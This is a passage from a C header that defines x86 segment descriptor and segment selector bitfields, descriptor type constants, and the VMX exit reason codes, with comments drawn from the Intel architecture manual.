#define SEGMENT__GRANULARITY_FLAG 0x800000
#define SEGMENT__GRANULARITY_MASK 0x01
#define SEGMENT__GRANULARITY(_) (((_) >> 23) & 0x01)

      /**
       * [Bits 31:24] Base address field (31:24); see description of $BASE_LOW for more details.
       */
      UINT32 BaseAddressHigh : 8;
#define SEGMENT__BASE_ADDRESS_HIGH_BIT 24
#define SEGMENT__BASE_ADDRESS_HIGH_FLAG 0xFF000000
#define SEGMENT__BASE_ADDRESS_HIGH_MASK 0xFF
#define SEGMENT__BASE_ADDRESS_HIGH(_) (((_) >> 24) & 0xFF)
    };

    UINT32 Flags;
  };

} SEGMENT_DESCRIPTOR_32;

/**
 * @brief General Segment Descriptor (64-bit)
 *
 * A segment descriptor is a data structure in a GDT or LDT that provides the processor with the
 * size and location of a segment, as well as access control and status information. Segment
 * descriptors are typically created by compilers, linkers, loaders, or the operating system or
 * executive, but not application programs.
 *
 * @see Vol3A[3.4.5(Segment Descriptors)] (reference)
 */
typedef struct {
  /**
   * @brief Segment limit field (15:00)
   *
   * Specifies the size of the segment. The processor puts together the two segment limit fields to
   * form a 20-bit value. The processor interprets the segment limit in one of two ways, depending
   * on the setting of the G (granularity) flag:
   * - If the granularity flag is clear, the segment size can range from 1 byte to 1 MByte, in byte
   * increments.
   * - If the granularity flag is set, the segment size can range from 4 KBytes to 4 GBytes, in
   * 4-KByte increments. The processor uses the segment limit in two different ways, depending on
   * whether the segment is an expand-up or an expand-down segment. For expand-up segments, the
   * offset in a logical address can range from 0 to the segment limit. Offsets greater than the
   * segment limit generate general-protection exceptions (\#GP, for all segments other than SS) or
   * stack-fault exceptions (\#SS for the SS segment). For expand-down segments, the segment limit
   * has the reverse function; the offset can range from the segment limit plus 1 to FFFFFFFFH or
   * FFFFH, depending on the setting of the B flag. Offsets less than or equal to the segment limit
   * generate general-protection exceptions or stack-fault exceptions. Decreasing the value in the
   * segment limit field for an expanddown segment allocates new memory at the bottom of the
   * segment's address space, rather than at the top. IA-32 architecture stacks always grow
   * downwards, making this mechanism convenient for expandable stacks.
   *
   * @see Vol3A[3.4.5.1(Code- and Data-Segment Descriptor Types)]
   */
  UINT16 SegmentLimitLow;

  /**
   * @brief Base address field (15:00)
   *
   * Defines the location of byte 0 of the segment within the 4-GByte linear address space. The
   * processor puts together the three base address fields to form a single 32-bit value. Segment
   * base addresses should be aligned to 16-byte boundaries. Although 16-byte alignment is not
   * required, this alignment allows programs to maximize performance by aligning code and data on
   * 16-byte boundaries.
   */
  UINT16 BaseAddressLow;
  /**
   * @brief Segment descriptor fields
   */
  union {
    struct {
      /**
       * [Bits 7:0] Base address field (23:16); see description of $BASE_LOW for more details.
       */
      UINT32 BaseAddressMiddle : 8;
#define SEGMENT__BASE_ADDRESS_MIDDLE_BIT 0
#define SEGMENT__BASE_ADDRESS_MIDDLE_FLAG 0xFF
#define SEGMENT__BASE_ADDRESS_MIDDLE_MASK 0xFF
#define SEGMENT__BASE_ADDRESS_MIDDLE(_) (((_) >> 0) & 0xFF)

      /**
       * @brief Type field
       *
       * [Bits 11:8] Indicates the segment or gate type and specifies the kinds of access that can
       * be made to the segment and the direction of growth. The interpretation of this field
       * depends on whether the descriptor type flag specifies an application (code or data)
       * descriptor or a system descriptor. The encoding of the type field is different for code,
       * data, and system descriptors.
       *
       * @see Vol3A[3.4.5.1(Code- and Data-Segment Descriptor Types)]
       */
      UINT32 Type : 4;
#define SEGMENT__TYPE_BIT 8
#define SEGMENT__TYPE_FLAG 0xF00
#define SEGMENT__TYPE_MASK 0x0F
#define SEGMENT__TYPE(_) (((_) >> 8) & 0x0F)

      /**
       * @brief S (descriptor type) flag
       *
       * [Bit 12] Specifies whether the segment descriptor is for a system segment (S flag is clear)
       * or a code or data segment (S flag is set).
       */
      UINT32 DescriptorType : 1;
#define SEGMENT__DESCRIPTOR_TYPE_BIT 12
#define SEGMENT__DESCRIPTOR_TYPE_FLAG 0x1000
#define SEGMENT__DESCRIPTOR_TYPE_MASK 0x01
#define SEGMENT__DESCRIPTOR_TYPE(_) (((_) >> 12) & 0x01)

      /**
       * @brief DPL (descriptor privilege level) field
       *
       * [Bits 14:13] Specifies the privilege level of the segment. The privilege level can range
       * from 0 to 3, with 0 being the most privileged level. The DPL is used to control access to
       * the segment. See Section 5.5, "Privilege Levels", for a description of the relationship of
       * the DPL to the CPL of the executing code segment and the RPL of a segment selector.
       */
      UINT32 DescriptorPrivilegeLevel : 2;
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL_BIT 13
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL_FLAG 0x6000
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL_MASK 0x03
#define SEGMENT__DESCRIPTOR_PRIVILEGE_LEVEL(_) (((_) >> 13) & 0x03)

      /**
       * @brief P (segment-present) flag
       *
       * [Bit 15] Indicates whether the segment is present in memory (set) or not present (clear).
       * If this flag is clear, the processor generates a segment-not-present exception (\#NP) when
       * a segment selector that points to the segment descriptor is loaded into a segment register.
       * Memory management software can use this flag to control which segments are actually loaded
       * into physical memory at a given time. It offers a control in addition to paging for
       * managing virtual memory.
       */
      UINT32 Present : 1;
#define SEGMENT__PRESENT_BIT 15
#define SEGMENT__PRESENT_FLAG 0x8000
#define SEGMENT__PRESENT_MASK 0x01
#define SEGMENT__PRESENT(_) (((_) >> 15) & 0x01)

      /**
       * [Bits 19:16] Segment limit field (19:16); see description of $LIMIT_LOW for more details.
       */
      UINT32 SegmentLimitHigh : 4;
#define SEGMENT__SEGMENT_LIMIT_HIGH_BIT 16
#define SEGMENT__SEGMENT_LIMIT_HIGH_FLAG 0xF0000
#define SEGMENT__SEGMENT_LIMIT_HIGH_MASK 0x0F
#define SEGMENT__SEGMENT_LIMIT_HIGH(_) (((_) >> 16) & 0x0F)

      /**
       * @brief Available bit
       *
       * [Bit 20] Bit 20 of the second doubleword of the segment descriptor is available for use by
       * system software.
       */
      UINT32 System : 1;
#define SEGMENT__SYSTEM_BIT 20
#define SEGMENT__SYSTEM_FLAG 0x100000
#define SEGMENT__SYSTEM_MASK 0x01
#define SEGMENT__SYSTEM(_) (((_) >> 20) & 0x01)

      /**
       * @brief L (64-bit code segment) flag
       *
       * [Bit 21] In IA-32e mode, bit 21 of the second doubleword of the segment descriptor
       * indicates whether a code segment contains native 64-bit code. A value of 1 indicates
       * instructions in this code segment are executed in 64-bit mode. A value of 0 indicates the
       * instructions in this code segment are executed in compatibility mode. If L-bit is set, then
       * D-bit must be cleared. When not in IA-32e mode or for non-code segments, bit 21 is reserved
       * and should always be set to 0.
       */
      UINT32 LongMode : 1;
#define SEGMENT__LONG_MODE_BIT 21
#define SEGMENT__LONG_MODE_FLAG 0x200000
#define SEGMENT__LONG_MODE_MASK 0x01
#define SEGMENT__LONG_MODE(_) (((_) >> 21) & 0x01)

      /**
       * @brief D/B (default operation size/default stack pointer size and/or upper bound) flag
       *
       * [Bit 22] Performs different functions depending on whether the segment descriptor is an
       * executable code segment, an expand-down data segment, or a stack segment. (This flag should
       * always be set to 1 for 32-bit code and data segments and to 0 for 16-bit code and data
       * segments.)
       * - Executable code segment. The flag is called the D flag and it indicates the default
       * length for effective addresses and operands referenced by instructions in the segment. If
       * the flag is set, 32-bit addresses and 32-bit or 8-bit operands are assumed; if it is clear,
       * 16-bit addresses and 16-bit or 8-bit operands are assumed. The instruction prefix 66H can
       * be used to select an operand size other than the default, and the prefix 67H can be used
       * select an address size other than the default.
       * - Stack segment (data segment pointed to by the SS register). The flag is called the B
       * (big) flag and it specifies the size of the stack pointer used for implicit stack
       * operations (such as pushes, pops, and calls). If the flag is set, a 32-bit stack pointer is
       * used, which is stored in the 32-bit ESP register; if the flag is clear, a 16-bit stack
       * pointer is used, which is stored in the 16- bit SP register. If the stack segment is set up
       * to be an expand-down data segment (described in the next paragraph), the B flag also
       * specifies the upper bound of the stack segment.
       * - Expand-down data segment. The flag is called the B flag and it specifies the upper bound
       * of the segment. If the flag is set, the upper bound is FFFFFFFFH (4 GBytes); if the flag is
       * clear, the upper bound is FFFFH (64 KBytes).
       */
      UINT32 DefaultBig : 1;
#define SEGMENT__DEFAULT_BIG_BIT 22
#define SEGMENT__DEFAULT_BIG_FLAG 0x400000
#define SEGMENT__DEFAULT_BIG_MASK 0x01
#define SEGMENT__DEFAULT_BIG(_) (((_) >> 22) & 0x01)

      /**
       * @brief G (granularity) flag
       *
       * [Bit 23] Determines the scaling of the segment limit field. When the granularity flag is
       * clear, the segment limit is interpreted in byte units; when flag is set, the segment limit
       * is interpreted in 4-KByte units. (This flag does not affect the granularity of the base
       * address; it is always byte granular.) When the granularity flag is set, the twelve least
       * significant bits of an offset are not tested when checking the offset against the segment
       * limit. For example, when the granularity flag is set, a limit of 0 results in valid offsets
       * from 0 to 4095.
       */
      UINT32 Granularity : 1;
#define SEGMENT__GRANULARITY_BIT 23
#define SEGMENT__GRANULARITY_FLAG 0x800000
#define SEGMENT__GRANULARITY_MASK 0x01
#define SEGMENT__GRANULARITY(_) (((_) >> 23) & 0x01)

      /**
       * [Bits 31:24] Base address field (31:24); see description of $BASE_LOW for more details.
       */
      UINT32 BaseAddressHigh : 8;
#define SEGMENT__BASE_ADDRESS_HIGH_BIT 24
#define SEGMENT__BASE_ADDRESS_HIGH_FLAG 0xFF000000
#define SEGMENT__BASE_ADDRESS_HIGH_MASK 0xFF
#define SEGMENT__BASE_ADDRESS_HIGH(_) (((_) >> 24) & 0xFF)
    };

    UINT32 Flags;
  };

  /**
   * Base address field (32:63); see description of $BASE_LOW for more details.
   */
  UINT32 BaseAddressUpper;

  /**
   * Base address field (32:63); see description of $BASE_LOW for more details.
   */
  UINT32 MustBeZero;
} SEGMENT_DESCRIPTOR_64;

#define SEGMENT_DESCRIPTOR_TYPE_SYSTEM 0x00000000
#define SEGMENT_DESCRIPTOR_TYPE_CODE_OR_DATA 0x00000001
/**
 * @defgroup SEGMENT_DESCRIPTOR_CODE_AND_DATA_TYPE \
 *           Code- and Data-Segment Descriptor Types
 *
 * When the S (descriptor type) flag in a segment descriptor is set, the descriptor is for either a
 * code or a data segment. The highest order bit of the type field (bit 11 of the second double word
 * of the segment descriptor) then determines whether the descriptor is for a data segment (clear)
 * or a code segment (set). For data segments, the three low-order bits of the type field (bits 8,
 * 9, and 10) are interpreted as accessed (A), write-enable (W), and expansion-direction (E). See
 * Table 3-1 for a description of the encoding of the bits in the type field for code and data
 * segments. Data segments can be read-only or read/write segments, depending on the setting of the
 * write-enable bit.
 *
 * @see Vol3A[3.4.5.1(Code- and Data-Segment Descriptor Types)] (reference)
 * @{
 */
/**
 * Read-Only.
 */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_ONLY 0x00000000

/**
 * Data Read-Only, accessed.
 */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_ONLY_ACCESSED 0x00000001

/**
 * Data Read/Write.
 */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_WRITE 0x00000002

/**
 * Data Read/Write, accessed.
 */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_WRITE_ACCESSED 0x00000003

/**
 * Data Read-Only, expand-down.
 */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_ONLY_EXPAND_DOWN 0x00000004

/**
 * Data Read-Only, expand-down, accessed.
 */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_ONLY_EXPAND_DOWN_ACCESSED 0x00000005

/**
 * Data Read/Write, expand-down.
 */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_WRITE_EXPAND_DOWN 0x00000006

/**
 * Data Read/Write, expand-down, accessed.
 */
#define SEGMENT_DESCRIPTOR_TYPE_DATA_READ_WRITE_EXPAND_DOWN_ACCESSED 0x00000007

/**
 * Code Execute-Only.
 */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_ONLY 0x00000008

/**
 * Code Execute-Only, accessed.
 */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_ONLY_ACCESSED 0x00000009

/**
 * Code Execute/Read.
 */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_READ 0x0000000A

/**
 * Code Execute/Read, accessed.
 */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_READ_ACCESSED 0x0000000B

/**
 * Code Execute-Only, conforming.
 */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_ONLY_CONFORMING 0x0000000C

/**
 * Code Execute-Only, conforming, accessed.
 */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_ONLY_CONFORMING_ACCESSED 0x0000000D

/**
 * Code Execute/Read, conforming.
 */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_READ_CONFORMING 0x0000000E

/**
 * Code Execute/Read, conforming, accessed.
 */
#define SEGMENT_DESCRIPTOR_TYPE_CODE_EXECUTE_READ_CONFORMING_ACCESSED 0x0000000F
/**
 * @}
 */

/**
 * @defgroup SEGMENT_DESCRIPTOR_SYSTEM_TYPE \
 *           System Descriptor Types
 *
 * When the S (descriptor type) flag in a segment descriptor is clear, the descriptor type is a
 * system descriptor. The processor recognizes the following types of system descriptors:
 * - Local descriptor-table (LDT) segment descriptor.
 * - Task-state segment (TSS) descriptor.
 * - Call-gate descriptor.
 * - Interrupt-gate descriptor.
 * - Trap-gate descriptor.
 * - Task-gate descriptor.
 * These descriptor types fall into two categories: system-segment descriptors and gate descriptors.
 * Systemsegment descriptors point to system segments (LDT and TSS segments). Gate descriptors are
 * in themselves "gates," which hold pointers to procedure entry points in code segments (call,
 * interrupt, and trap gates) or which hold segment selectors for TSS's (task gates).
 *
 * @see Vol3A[3.5(SYSTEM DESCRIPTOR TYPES)] (reference)
 * @{
 */
/**
 * - 32-Bit Mode: Reserved
 * - IA-32e Mode: Reserved
 */
#define SEGMENT_DESCRIPTOR_TYPE_RESERVED_1 0x00000000

/**
 * - 32-Bit Mode: 16-bit TSS (Available)
 * - IA-32e Mode: Reserved
 */
#define SEGMENT_DESCRIPTOR_TYPE_TSS_16_AVAILABLE 0x00000001

/**
 * - 32-Bit Mode: LDT
 * - IA-32e Mode: LDT
 */
#define SEGMENT_DESCRIPTOR_TYPE_LDT 0x00000002

/**
 * - 32-Bit Mode: 16-bit TSS (Busy)
 * - IA-32e Mode: Reserved
 */
#define SEGMENT_DESCRIPTOR_TYPE_TSS_16_BUSY 0x00000003

/**
 * - 32-Bit Mode: 16-bit Call Gate
 * - IA-32e Mode: Reserved
 */
#define SEGMENT_DESCRIPTOR_TYPE_CALL_GATE_16 0x00000004

/**
 * - 32-Bit Mode: Task Gate
 * - IA-32e Mode: Reserved
 */
#define SEGMENT_DESCRIPTOR_TYPE_TASK_GATE 0x00000005

/**
 * - 32-Bit Mode: 16-bit Interrupt Gate
 * - IA-32e Mode: Reserved
 */
#define SEGMENT_DESCRIPTOR_TYPE_INTERRUPT_GATE_16 0x00000006

/**
 * - 32-Bit Mode: 16-bit Trap Gate
 * - IA-32e Mode: Reserved
 */
#define SEGMENT_DESCRIPTOR_TYPE_TRAP_GATE_16 0x00000007

/**
 * - 32-Bit Mode: Reserved
 * - IA-32e Mode: Reserved
 */
#define SEGMENT_DESCRIPTOR_TYPE_RESERVED_2 0x00000008

/**
 * - 32-Bit Mode: 32-bit TSS (Available)
 * - IA-32e Mode: 64-bit TSS (Available)
 */
#define SEGMENT_DESCRIPTOR_TYPE_TSS_AVAILABLE 0x00000009

/**
 * - 32-Bit Mode: Reserved
 * - IA-32e Mode: Reserved
 */
#define SEGMENT_DESCRIPTOR_TYPE_RESERVED_3 0x0000000A

/**
 * - 32-Bit Mode: 32-bit TSS (Busy)
 * - IA-32e Mode: 64-bit TSS (Busy)
 */
#define SEGMENT_DESCRIPTOR_TYPE_TSS_BUSY 0x0000000B

/**
 * - 32-Bit Mode: 32-bit Call Gate
 * - IA-32e Mode: 64-bit Call Gate
 */
#define SEGMENT_DESCRIPTOR_TYPE_CALL_GATE 0x0000000C

/**
 * - 32-Bit Mode: Reserved
 * - IA-32e Mode: Reserved
 */
#define SEGMENT_DESCRIPTOR_TYPE_RESERVED_4 0x0000000D

/**
 * - 32-Bit Mode: 32-bit Interrupt Gate
 * - IA-32e Mode: 64-bit Interrupt Gate
 */
#define SEGMENT_DESCRIPTOR_TYPE_INTERRUPT_GATE 0x0000000E

/**
 * - 32-Bit Mode: 32-bit Trap Gate
 * - IA-32e Mode: 64-bit Trap Gate
 */
#define SEGMENT_DESCRIPTOR_TYPE_TRAP_GATE 0x0000000F
/**
 * @}
 */

/**
 * @brief A segment selector is a 16-bit identifier for a segment. It does not point directly to the
 * segment, but instead points to the segment descriptor that defines the segment
 *
 * @see Vol3A[3.4.2(Segment Selectors)] (reference)
 */
typedef union {
  struct {
    /**
     * [Bits 1:0] Specifies the privilege level of the selector. The privilege level can range from
     * 0 to 3, with 0 being the most privileged level.
     *
     * @see Vol3A[5.5(Privilege Levels)]
     */
    UINT16 RequestPrivilegeLevel : 2;
#define SEGMENT_SELECTOR_REQUEST_PRIVILEGE_LEVEL_BIT 0
#define SEGMENT_SELECTOR_REQUEST_PRIVILEGE_LEVEL_FLAG 0x03
#define SEGMENT_SELECTOR_REQUEST_PRIVILEGE_LEVEL_MASK 0x03
#define SEGMENT_SELECTOR_REQUEST_PRIVILEGE_LEVEL(_) (((_) >> 0) & 0x03)

    /**
     * [Bit 2] Specifies the descriptor table to use: clearing this flag selects the GDT; setting
     * this flag selects the current LDT.
     */
    UINT16 Table : 1;
#define SEGMENT_SELECTOR_TABLE_BIT 2
#define SEGMENT_SELECTOR_TABLE_FLAG 0x04
#define SEGMENT_SELECTOR_TABLE_MASK 0x01
#define SEGMENT_SELECTOR_TABLE(_) (((_) >> 2) & 0x01)

    /**
     * [Bits 15:3] Selects one of 8192 descriptors in the GDT or LDT. The processor multiplies the
     * index value by 8 (the number of bytes in a segment descriptor) and adds the result to the
     * base address of the GDT or LDT (from the GDTR or LDTR register, respectively).
     */
    UINT16 Index : 13;
#define SEGMENT_SELECTOR_INDEX_BIT 3
#define SEGMENT_SELECTOR_INDEX_FLAG 0xFFF8
#define SEGMENT_SELECTOR_INDEX_MASK 0x1FFF
#define SEGMENT_SELECTOR_INDEX(_) (((_) >> 3) & 0x1FFF)
  };

  UINT16 Flags;
} SEGMENT_SELECTOR;

/**
 * @}
 */

/**
 * @defgroup VMX \
 *           VMX
 * @{
 */
/**
 * @{
 */
/**
 * @defgroup VMX_BASIC_EXIT_REASONS \
 *           VMX Basic Exit Reasons
 *
 * VMX Basic Exit Reasons.
 *
 * @see Vol3D[C(VMX BASIC EXIT REASONS)] (reference)
 * @{
 */
/**
 * @brief Exception or non-maskable interrupt (NMI)
 *
 * Either:
 * -# Guest software caused an exception and the bit in the exception bitmap associated with
 * exception's vector was 1. This case includes executions of BOUND that cause \#BR, executions of
 * INT1 (they cause \#DB), executions of INT3 (they cause
 * \#BP), executions of INTO that cause \#OF, and executions of UD0, UD1, and UD2 (they cause \#UD).
 * -# An NMI was delivered to the logical processor and the "NMI exiting" VM-execution control
 * was 1.
 */
#define VMX_EXIT_REASON_EXCEPTION_OR_NMI 0x00000000

/**
 * @brief External interrupt
 *
 * An external interrupt arrived and the "external-interrupt exiting" VM-execution control was 1.
 */
#define VMX_EXIT_REASON_EXTERNAL_INTERRUPT 0x00000001

/**
 * @brief Triple fault
 *
 * The logical processor encountered an exception while attempting to call the double-fault handler
 * and that exception did not itself cause a VM exit due to the exception bitmap.
 */
#define VMX_EXIT_REASON_TRIPLE_FAULT 0x00000002

/**
 * @brief INIT signal
 *
 * An INIT signal arrived.
 */
#define VMX_EXIT_REASON_INIT_SIGNAL 0x00000003

/**
 * @brief Start-up IPI (SIPI)
 *
 * A SIPI arrived while the logical processor was in the "wait-for-SIPI" state.
 */
#define VMX_EXIT_REASON_STARTUP_IPI 0x00000004

/**
 * @brief I/O system-management interrupt (SMI)
 *
 * An SMI arrived immediately after retirement of an I/O instruction and caused an SMM VM exit.
 *
 * @see Vol3C[34.15.2(SMM VM Exits)]
 */
#define VMX_EXIT_REASON_IO_SMI 0x00000005

/**
 * @brief Other SMI
 *
 * An SMI arrived and caused an SMM VM exit but not immediately after retirement of an I/O
 * instruction.
 *
 * @see Vol3C[34.15.2(SMM VM Exits)]
 */
#define VMX_EXIT_REASON_SMI 0x00000006

/**
 * @brief Interrupt window exiting
 *
 * At the beginning of an instruction, RFLAGS.IF was 1; events were not blocked by STI or by MOV SS;
 * and the "interrupt-window exiting" VM-execution control was 1.
 */
#define VMX_EXIT_REASON_INTERRUPT_WINDOW 0x00000007

/**
 * @brief NMI window exiting
 *
 * At the beginning of an instruction, there was no virtual-NMI blocking; events were not blocked by
 * MOV SS; and the "NMI-window exiting" VM-execution control was 1.
 */
#define VMX_EXIT_REASON_NMI_WINDOW 0x00000008

/**
 * @brief Task switch
 *
 * Guest software attempted a task switch.
 */
#define VMX_EXIT_REASON_TASK_SWITCH 0x00000009

/**
 * @brief CPUID
 *
 * Guest software attempted to execute CPUID.
 */
#define VMX_EXIT_REASON_EXECUTE_CPUID 0x0000000A

/**
 * @brief GETSEC
 *
 * Guest software attempted to execute GETSEC.
 */
#define VMX_EXIT_REASON_EXECUTE_GETSEC 0x0000000B

/**
 * @brief HLT
 *
 * Guest software attempted to execute HLT and the "HLT exiting" VM-execution control was 1.
 */
#define VMX_EXIT_REASON_EXECUTE_HLT 0x0000000C

/**
 * @brief INVD
 *
 * Guest software attempted to execute INVD.
 */
#define VMX_EXIT_REASON_EXECUTE_INVD 0x0000000D

/**
 * @brief INVLPG
 *
 * Guest software attempted to execute INVLPG and the "INVLPG exiting" VM-execution control was 1.
 */
#define VMX_EXIT_REASON_EXECUTE_INVLPG 0x0000000E

/**
 * @brief RDPMC
 *
 * Guest software attempted to execute RDPMC and the "RDPMC exiting" VM-execution control was 1.
 */
#define VMX_EXIT_REASON_EXECUTE_RDPMC 0x0000000F

/**
 * @brief RDTSC
 *
 * Guest software attempted to execute RDTSC and the "RDTSC exiting" VM-execution control was 1.
 */
#define VMX_EXIT_REASON_EXECUTE_RDTSC 0x00000010

/**
 * @brief RSM in SMM
 *
 * Guest software attempted to execute RSM in SMM.
 */
#define VMX_EXIT_REASON_EXECUTE_RSM_IN_SMM 0x00000011

/**
 * @brief VMCALL
 *
 * VMCALL was executed either by guest software (causing an ordinary VM exit) or by the executive
 * monitor (causing an SMM VM exit).
 *
 * @see Vol3C[34.15.2(SMM VM Exits)]
 */
#define VMX_EXIT_REASON_EXECUTE_VMCALL 0x00000012

/**
 * @brief VMCLEAR
 *
 * Guest software attempted to execute VMCLEAR.
 */
#define VMX_EXIT_REASON_EXECUTE_VMCLEAR 0x00000013

/**
 * @brief VMLAUNCH
 *
 * Guest software attempted to execute VMLAUNCH.
 */
#define VMX_EXIT_REASON_EXECUTE_VMLAUNCH 0x00000014

/**
 * @brief VMPTRLD
 *
 * Guest software attempted to execute VMPTRLD.
 */
#define VMX_EXIT_REASON_EXECUTE_VMPTRLD 0x00000015

/**
 * @brief VMPTRST
 *
 * Guest software attempted to execute VMPTRST.
 */
#define VMX_EXIT_REASON_EXECUTE_VMPTRST 0x00000016

/**
 * @brief VMREAD
 *
 * Guest software attempted to execute VMREAD.
 */
#define VMX_EXIT_REASON_EXECUTE_VMREAD 0x00000017

/**
 * @brief VMRESUME
 *
 * Guest software attempted to execute VMRESUME.
 */
#define VMX_EXIT_REASON_EXECUTE_VMRESUME 0x00000018

/**
 * @brief VMWRITE
 *
 * Guest software attempted to execute VMWRITE.
 */
#define VMX_EXIT_REASON_EXECUTE_VMWRITE 0x00000019

/**
 * @brief VMXOFF
 *
 * Guest software attempted to execute VMXOFF.
 */
#define VMX_EXIT_REASON_EXECUTE_VMXOFF 0x0000001A

/**
 * @brief VMXON
 *
 * Guest software attempted to execute VMXON.
 */
#define VMX_EXIT_REASON_EXECUTE_VMXON 0x0000001B

/**
 * @brief Control-register accesses
 *
 * Guest software attempted to access CR0, CR3, CR4, or CR8 using CLTS, LMSW, or MOV CR and the
 * VM-execution control fields indicate that a VM exit should occur. This basic exit reason is not
 * used for trap-like VM exits following executions of the MOV to CR8 instruction when the "use TPR
 * shadow" VM-execution control is 1. Such VM exits instead use basic exit reason 43.
 *
 * @see Vol3C[25.1(INSTRUCTIONS THAT CAUSE VM EXITS)]
 */
#define VMX_EXIT_REASON_MOV_CR 0x0000001C

/**
 * @brief Debug-register accesses
 *
 * Guest software attempted a MOV to or from a debug register and the "MOV-DR exiting" VM-execution
 * control was 1.
 */
#define VMX_EXIT_REASON_MOV_DR 0x0000001D

/**
 * @brief I/O instruction
 *
 * Guest software attempted to execute an I/O instruction and either:
 * -# The "use I/O bitmaps" VM-execution control was 0 and the "unconditional I/O exiting"
 * VM-execution control was 1.
 * -# The "use I/O bitmaps" VM-execution control was 1 and a bit in the I/O bitmap associated with
 * one of the ports accessed by the I/O instruction was 1.
 */
#define VMX_EXIT_REASON_EXECUTE_IO_INSTRUCTION 0x0000001E

/**
 * @brief RDMSR
 *
 * Guest software attempted to execute RDMSR and either:
 * -# The "use MSR bitmaps" VM-execution control was 0.
 * -# The value of RCX is neither in the range 00000000H - 00001FFFH nor in the range C0000000H -
 * C0001FFFH.
 * -# The value of RCX was in the range 00000000H - 00001FFFH and the nth bit in read bitmap for low
 * MSRs is 1, where n was the value of RCX.
 * -# The value of RCX is in the range C0000000H - C0001FFFH and the nth bit in read bitmap for high
 * MSRs is 1, where n is the value of RCX & 00001FFFH.
 */
#define VMX_EXIT_REASON_EXECUTE_RDMSR 0x0000001F

/**
 * @brief WRMSR
 *
 * Guest software attempted to execute WRMSR and either:
 * -# The "use MSR bitmaps" VM-execution control was 0.
 * -# The value of RCX is neither in the range 00000000H - 00001FFFH nor in the range C0000000H -
 * C0001FFFH.
 * -# The value of RCX was in the range 00000000H - 00001FFFH and the nth bit in write bitmap for
 * low MSRs is 1, where n was the value of RCX.
 * -# The value of RCX is in the range C0000000H - C0001FFFH and the nth bit in write bitmap for
 * high MSRs is 1, where n is the value of RCX & 00001FFFH.
 */
#define VMX_EXIT_REASON_EXECUTE_WRMSR 0x00000020

/**
 * @brief VM-entry failure due to invalid guest state
 *
 * A VM entry failed one of the checks identified in Section 26.3.1.
 */
#define VMX_EXIT_REASON_ERROR_INVALID_GUEST_STATE 0x00000021

/**
 * @brief VM-entry failure due to MSR loading
 *
 * A VM entry failed in an attempt to load MSRs. See Section 26.4.
 */
#define VMX_EXIT_REASON_ERROR_MSR_LOAD 0x00000022

/**
 * @brief Guest software executed MWAIT
 *
 * Guest software attempted to execute MWAIT and the "MWAIT exiting" VM-execution control was 1.
 */
#define VMX_EXIT_REASON_EXECUTE_MWAIT 0x00000024

/**
 * @brief VM-exit due to monitor trap flag
 *
 * A VM entry occurred due to the 1-setting of the "monitor trap flag" VM-execution control and
 * injection of an MTF VM exit as part of VM entry.
 *
 * @see Vol3C[25.5.2(Monitor Trap Flag)]
 */
#define VMX_EXIT_REASON_MONITOR_TRAP_FLAG 0x00000025

/**
 * @brief Guest software attempted to execute MONITOR
 *
 * Guest software attempted to execute MONITOR and the "MONITOR exiting" VM-execution control was 1.
 */
#define VMX_EXIT_REASON_EXECUTE_MONITOR 0x00000027

/**
 * @brief Guest software attempted to execute PAUSE
 *
 * Either guest software attempted to execute PAUSE and the "PAUSE exiting" VM-execution control was
 * 1 or the "PAUSE-loop exiting" VM-execution control was 1 and guest software executed a PAUSE loop
 * with execution time exceeding PLE_Window.
 *
 * @see Vol3C[25.1.3(Instructions That Cause VM Exits Conditionally)]
 */
#define VMX_EXIT_REASON_EXECUTE_PAUSE 0x00000028

/**
 * @brief VM-entry failure due to machine-check
 *
 * A machine-check event occurred during VM entry.
 *
 * @see Vol3C[26.8(MACHINE-CHECK EVENTS DURING VM ENTRY)]
 */
#define VMX_EXIT_REASON_ERROR_MACHINE_CHECK 0x00000029

/**
 * @brief TPR below threshold
 *
 * The logical processor determined that the value of bits 7:4 of the byte at offset 080H on the
 * virtual-APIC page was below that of the TPR threshold VM-execution control field while the "use
 * TPR shadow" VMexecution control was 1 either as part of TPR virtualization or VM entry.
 *
 * @see Vol3C[29.1.2(TPR Virtualization)]
 * @see Vol3C[26.6.7(VM Exits Induced by the TPR Threshold)]
 */
#define VMX_EXIT_REASON_TPR_BELOW_THRESHOLD 0x0000002B

/**
 * @brief APIC access
 *
 * Guest software attempted to access memory at a physical address on the APIC-access page and the
 * "virtualize APIC accesses" VM-execution control was 1.
 *
 * @see Vol3C[29.4(VIRTUALIZING MEMORY-MAPPED APIC ACCESSES)]
 */
#define VMX_EXIT_REASON_APIC_ACCESS 0x0000002C

/**
 * @brief Virtualized EOI
 *
 * EOI virtualization was performed for a virtual interrupt whose vector indexed a bit set in the
 * EOIexit bitmap.
 */
#define VMX_EXIT_REASON_VIRTUALIZED_EOI 0x0000002D

/**
 * @brief Access to GDTR or IDTR
 *
 * Guest software attempted to execute LGDT, LIDT, SGDT, or SIDT and the "descriptor-table exiting"
 * VM-execution control was 1.
 */
#define VMX_EXIT_REASON_GDTR_IDTR_ACCESS 0x0000002E

/**
 * @brief Access to LDTR or TR
 *
 * Guest software attempted to execute LLDT, LTR, SLDT, or STR and the "descriptor-table exiting"
 * VM-execution control was 1.
 */
#define VMX_EXIT_REASON_LDTR_TR_ACCESS 0x0000002F

/**
 * @brief EPT violation
 *
 * An attempt to access memory with a guest-physical address was disallowed by the configuration of
 * the EPT paging structures.
 */
#define VMX_EXIT_REASON_EPT_VIOLATION 0x00000030

/**
 * @brief EPT misconfiguration
 *
 * An attempt to access memory with a guest-physical address encountered a misconfigured EPT
 * paging-structure entry.
 */
